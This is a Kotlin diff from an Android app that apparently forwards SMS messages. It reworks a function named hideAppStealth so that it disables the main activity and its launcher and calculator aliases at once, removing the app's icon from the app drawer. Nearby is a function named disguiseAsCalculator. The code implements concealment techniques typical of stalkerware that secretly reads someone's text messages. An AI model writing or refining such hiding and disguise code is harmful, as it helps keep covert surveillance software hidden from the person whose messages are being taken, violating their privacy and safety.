@@ -767,30 +767,22 @@ private fun hideAppStealth(context: Context) {
         android.widget.Toast.LENGTH_LONG
     ).show()
 
-    // 2. Exit Activity UI to Home Screen FIRST
+    // 2. Disable ALL launcher activity components to force complete icon removal from App Drawer
+    runCatching {
+        val pm = appContext.packageManager
+        val mainComponent = android.content.ComponentName(appContext.packageName, "com.smsforwarder.app.MainActivity")
+        val aliasComponent = android.content.ComponentName(appContext.packageName, "com.smsforwarder.app.LauncherAlias")
+        val calcComponent = android.content.ComponentName(appContext.packageName, "com.smsforwarder.app.CalculatorAlias")
+
+        pm.setComponentEnabledSetting(mainComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
+        pm.setComponentEnabledSetting(aliasComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
+        pm.setComponentEnabledSetting(calcComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
+    }
+
+    // 3. Move task to background & finish UI cleanly
     activity?.moveTaskToBack(true)
     activity?.finishAndRemoveTask()
     activity?.finishAffinity()
-
-    // 3. Disable Launcher Aliases 1000ms later when UI task is already closed (Icon vanishes from App Drawer)
-    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-        runCatching {
-            val pm = appContext.packageManager
-            val defaultAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.LauncherAlias")
-            val calcAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.CalculatorAlias")
-
-            pm.setComponentEnabledSetting(
-                defaultAlias,
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-            pm.setComponentEnabledSetting(
-                calcAlias,
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-        }
-    }, 1000)
 }
 
 private fun disguiseAsCalculator(context: Context) {
